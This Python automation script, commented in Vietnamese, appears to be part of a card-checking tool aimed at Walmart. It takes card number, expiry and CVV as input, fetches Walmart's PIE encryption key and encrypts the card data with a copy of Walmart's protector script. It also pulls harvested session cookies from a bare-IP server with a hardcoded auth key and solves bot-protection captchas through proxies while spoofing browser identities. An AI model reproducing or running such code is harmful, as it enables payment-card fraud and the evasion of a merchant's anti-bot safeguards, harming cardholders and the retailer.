import os, uuid, random, json, time, hashlib, base64, urllib.parse
from flowlite import Flow, step, finalize, expect, http
from flowlite.plugins import CurlDump, MaskCookies, ParseBetweenStrings, SQLiteWrapper, CaptchaWrapper
from flowlite.plugins.captcha_wrapper import CaptchaWrapper as CaptchaWrapperClass

flow = Flow("walmart").debug(trace=True)

LOG_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "logs", "curl"))
flow.use(MaskCookies)
flow.use(ParseBetweenStrings)
flow.use(SQLiteWrapper)
flow.use(CaptchaWrapper)
# flow.use(CurlDump, dir=LOG_DIR, include_response=True, split_by_flow=True)

@step("init_input")
def init_input(ctx):
    """Khởi tạo các biến input từ request"""
    ctx.CCNUM = ctx.data.get("CCNUM", "")
    ctx.MM = ctx.data.get("MM", "")
    ctx.YYYY = ctx.data.get("YYYY", "")
    ctx.CCV = ctx.data.get("CCV", "")
    
    expect.truthy(ctx.CCNUM, "CCNUM is required")
    expect.truthy(ctx.MM, "MM is required")
    expect.truthy(ctx.YYYY, "YYYY is required")
    expect.truthy(ctx.CCV, "CCV is required")

@step("get_pie_key")
def get_pie_key(ctx):
    """Lấy PIE key và key_id từ Walmart PIE service"""
    url = "https://securedataweb.walmart.com/pie/v1/wmcom_us_vtg_pie/getkey.js"
    
    r = (http.get(url)
           .accept("*/*")
           .header("accept-language", "en-US,en;q=0.9")
           .header("connection", "keep-alive")
           .accept_encoding("gzip, deflate, br")
           .user_agent("Walmart/2504042133 CFNetwork/1335.0.3.4 Darwin/21.6.0")
           .label("walmart-pie-getkey")
           .via_tls()
           .timeout(30.0)
           .send())
    
    expect.eq(r.status, 200, "Failed to get PIE key")
    
    body = r.text() or ""
    
    # Lấy PIE.K = "..." 
    ctx.PIEKEY = ctx.vars.parse_between(body, 'PIE.K = "', '";')
    if not ctx.PIEKEY:
        ctx.status = "BAN"
        raise AssertionError("BAN: PIEKEY not found in response")
    
    # Lấy PIE.key_id = "..." 
    ctx.key_id = ctx.vars.parse_between(body, 'PIE.key_id = "', '";')
    if not ctx.key_id:
        ctx.status = "BAN"
        raise AssertionError("BAN: key_id not found in response")
    
    # Validate key_id format (hex 6-8 characters)
    import re
    if not re.match(r'^[0-9a-fA-F]{6,8}$', ctx.key_id):
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Invalid key_id format: {ctx.key_id} (expected 6-8 hex characters)")
    
    # Validate PIEKEY format (hex 32 characters)  
    if not re.match(r'^[0-9a-fA-F]{32}$', ctx.PIEKEY):
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Invalid PIEKEY format: {ctx.PIEKEY}")

@step("run_pan_protector")
def run_pan_protector(ctx):
    """Chạy script pan-protector.full.js để mã hóa PAN và CVV"""
    from flowlite import js
    
    # Chuẩn bị arguments cho script
    script_args = {
        "PIEKEY": ctx.PIEKEY,
        "key_id": ctx.key_id,
        "CCNUM": ctx.CCNUM,
        "CCV": ctx.CCV
    }
    
    # Chạy script Node.js - js.run trả về trực tiếp kết quả
    try:
        data = js.run("flows/js/pie/pan-protector.full.js", script_args, expect="json", timeout=30.0)
        
        ctx.protected_s = data.get("s")
        ctx.protected_q = data.get("q") 
        ctx.protected_mac = data.get("mac")
        ctx.legacy_mode = data.get("legacy", False)
        
        expect.truthy(ctx.protected_s, "protected_s not found in script output")
        expect.truthy(ctx.protected_q, "protected_q not found in script output")
        expect.truthy(ctx.protected_mac, "protected_mac not found in script output")
        
    except Exception as e:
        raise AssertionError(f"Script failed: {e}")

@step("get_wm_cookies")
def get_wm_cookies(ctx):
    """Lấy cookies từ endpoint wm-cookies.txt"""
    url = "http://172.236.141.206:33668/getline/wm-cookies.txt"
    
    r = (http.get(url)
           .accept("*/*")
           .header("pragma", "no-cache")
           .header("accept-language", "en-US,en;q=0.8")
           .header("auth-key", "W6FBn0dIhAPsT8jsi2UnLXzMgtBb0YePNUk37T3pE4T07Tsuf7")
           .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")
           .label("wm-cookies-getline")
           .via_requests()  # Không qua TLS
           .timeout(30.0)
           .send())
    
    expect.eq(r.status, 200, "Failed to get wm-cookies")
    
    body = r.text() or ""
    
    # Lấy giá trị giữa "message":"{{{[{" và "}]}}}"
    ctx.cookie_all = ctx.vars.parse_between(body, '"message":"{{{', '}}}"')
    if not ctx.cookie_all:
        ctx.status = "BAN"
        raise AssertionError("BAN: cookie_all not found in response")

@step("call_captcha_plugin")
def call_captcha_plugin(ctx):
    """Sử dụng Captcha plugin để xử lý captcha và lưu vào database"""
    
    # Khởi tạo các biến nếu chưa có
    if not hasattr(ctx, 'pxhd'):
        ctx.pxhd = ""
    if not hasattr(ctx, 'Ua'):
        ctx.Ua = ""
    if not hasattr(ctx, 'sechua'):
        ctx.sechua = ""
    if not hasattr(ctx, 'paradata'):
        ctx.paradata = ""
    
    # Lấy proxy từ session
    session_proxy = ctx.session.get("proxy", "")
    ctx.session_proxy = session_proxy  # Lưu vào context
    print(f"DEBUG - Using proxy from session: {session_proxy}")
    
    # Chuẩn bị tham số cho Captcha plugin
    captcha_params = {
        "auth": "S[0EG;<67GH05EE607:I30E:F80I3F7:ED5E<I5",
        "site": "walmart",
        "proxyregion": "us",
        "region": "com",
        "proxy": session_proxy
    }
    
    print(f"DEBUG - Calling captcha plugin with params: {captcha_params}")
    
    # Tạo instance CaptchaWrapper trực tiếp
    captcha_wrapper = CaptchaWrapperClass()
    
    # Gọi Captcha plugin - nó sẽ tự động kiểm tra database và xử lý
    result = captcha_wrapper.generate_and_hold_captcha(
        flow_id=getattr(ctx, 'uuid', None),
        **captcha_params
    )
    
    print(f"DEBUG - Captcha plugin result: {result}")
    
    if result.get("success"):
        # Cập nhật các giá trị từ kết quả plugin
        ctx.Ua = result.get("UserAgent", "")
        ctx.sechua = result.get("secHeader", "")
        # pxhd chỉ có khi gọi /gen, không cập nhật từ holdcaptcha
        if result.get("pxhd"):
            ctx.pxhd = result.get("pxhd", "")
        ctx.paradata = result.get("data", "")
        
        # Debug: hiển thị các giá trị được cập nhật
        print(f"DEBUG - Updated Ua: {ctx.Ua}")
        print(f"DEBUG - Updated sechua: {ctx.sechua}")
        print(f"DEBUG - Updated pxhd: {getattr(ctx, 'pxhd', 'Not set')}")
        print(f"DEBUG - Updated paradata: {ctx.paradata}")
        
        # Lưu response đầy đủ
        ctx.holdcaptcha_response = {
            "error": False,
            "cookie": result.get("cookie", ""),
            "vid": result.get("vid", ""),
            "cts": result.get("cts", ""),
            "secHeader": result.get("secHeader", ""),
            "isMaybeFlagged": result.get("isMaybeFlagged", False),
            "UserAgent": result.get("UserAgent", ""),
            "flaggedPOW": result.get("flaggedPOW", False),
            "data": result.get("data", "")
        }
        
    else:
        # Xử lý lỗi
        error_msg = result.get("error", "Unknown captcha error")
        print(f"DEBUG - Captcha plugin failed: {error_msg}")
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Captcha plugin failed: {error_msg}")

@step("process_cookies_for_tls")
def process_cookies_for_tls(ctx):
    """Xử lý cookies để sử dụng với via_tls requests"""
    import json
    import re
    
    try:
        # Debug: in ra nội dung cookie_all để kiểm tra
        print(f"DEBUG - cookie_all length: {len(ctx.cookie_all)}")
        print(f"DEBUG - cookie_all first 200 chars: {ctx.cookie_all[:200]}")
        print(f"DEBUG - cookie_all last 200 chars: {ctx.cookie_all[-200:]}")
        
        # Thử parse JSON trực tiếp trước
        try:
            cookies_data = json.loads(ctx.cookie_all)
            print(f"DEBUG - Direct JSON parse successful, type: {type(cookies_data)}")
            
            if isinstance(cookies_data, list):
                cookie_pairs = []
                for cookie in cookies_data:
                    if isinstance(cookie, dict) and 'name' in cookie and 'value' in cookie:
                        cookie_pairs.append(f"{cookie['name']}={cookie['value']}")
                
                ctx.cookie_all_via_tls = "; ".join(cookie_pairs)
                print(f"DEBUG - Processed {len(cookie_pairs)} cookies from direct JSON")
                return
                
        except json.JSONDecodeError as e:
            print(f"DEBUG - Direct JSON parse failed: {e}")
        
        # Nếu JSON parse thất bại, thử unescape trước
        print("DEBUG - Trying to unescape JSON...")
        try:
            # Unescape JSON string
            unescaped = ctx.cookie_all.replace('\\"', '"').replace('\\\\', '\\')
            print(f"DEBUG - Unescaped first 200 chars: {unescaped[:200]}")
            
            cookies_data = json.loads(unescaped)
            print(f"DEBUG - Unescaped JSON parse successful, type: {type(cookies_data)}")
            
            if isinstance(cookies_data, list):
                cookie_pairs = []
                for cookie in cookies_data:
                    if isinstance(cookie, dict) and 'name' in cookie and 'value' in cookie:
                        cookie_pairs.append(f"{cookie['name']}={cookie['value']}")
                
                ctx.cookie_all_via_tls = "; ".join(cookie_pairs)
                print(f"DEBUG - Processed {len(cookie_pairs)} cookies from unescaped JSON")
                return
                
        except json.JSONDecodeError as e:
            print(f"DEBUG - Unescaped JSON parse failed: {e}")
        
        # Nếu vẫn thất bại, dùng regex như fallback
        print("DEBUG - Falling back to regex extraction...")
        cookie_pattern = r'"name":"([^"]+)"[^,]*"value":"([^"]+)"'
        matches = re.findall(cookie_pattern, ctx.cookie_all)
        
        if not matches:
            # Thử pattern cho escaped JSON
            escaped_pattern = r'\\"name\\":\\"([^"]+)\\"[^,]*\\"value\\":\\"([^"]+)\\"'
            matches = re.findall(escaped_pattern, ctx.cookie_all)
            print(f"DEBUG - Escaped pattern found {len(matches)} matches")
        
        if not matches:
            ctx.status = "BAN"
            raise AssertionError("BAN: No cookies found in response")
        
        # Tạo cookie string cho via_tls
        cookie_pairs = []
        for name, value in matches:
            cookie_pairs.append(f"{name}={value}")
        
        # Lưu cookie string cho via_tls
        ctx.cookie_all_via_tls = "; ".join(cookie_pairs)
        
        # Debug: in ra số lượng cookies và một vài ví dụ
        print(f"DEBUG - Processed {len(cookie_pairs)} cookies for via_tls")
        print(f"DEBUG - First few cookies: {cookie_pairs[:3]}")
        
    except Exception as e:
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Failed to process cookies: {e}")

@finalize
def done(ctx):
    """Kết thúc flow và trả về kết quả"""
    return {
        "status": ctx.get("status", "UNKNOWN"),
        "uuid": ctx.get("uuid"),
        "http_traces": len(ctx.meta.get("http_trace") or []),
        "CCNUM": ctx.CCNUM,
        "MM": ctx.MM,
        "YYYY": ctx.YYYY,
        "CCV": ctx.CCV,
        "PIEKEY": ctx.get("PIEKEY"),
        "key_id": ctx.get("key_id"),
        "protected_s": ctx.get("protected_s"),
        "protected_q": ctx.get("protected_q"),
        "protected_mac": ctx.get("protected_mac"),
        "legacy_mode": ctx.get("legacy_mode"),
        "cookie_all_via_tls": ctx.get("cookie_all_via_tls"),
        "Ua": ctx.get("Ua"),
        "sechua": ctx.get("sechua"),
        "pxhd": ctx.get("pxhd"),
        "paradata": ctx.get("paradata"),
        "session_proxy": ctx.get("session_proxy"),
        "holdcaptcha_response": ctx.get("holdcaptcha_response"),
        "captcha_plugin_used": True,  # Đánh dấu đã sử dụng Captcha plugin
    }

flow.register(globals())

if __name__ == "__main__":
    out = flow.run(data={
        "CCNUM": "4111111111111111",
        "MM": "12",
        "YYYY": "2025",
        "CCV": "123"
    }, session={"profile":"chrome_133"}, options={"httpVersion":"h2"})
    print(json.dumps(out, ensure_ascii=False, indent=2))
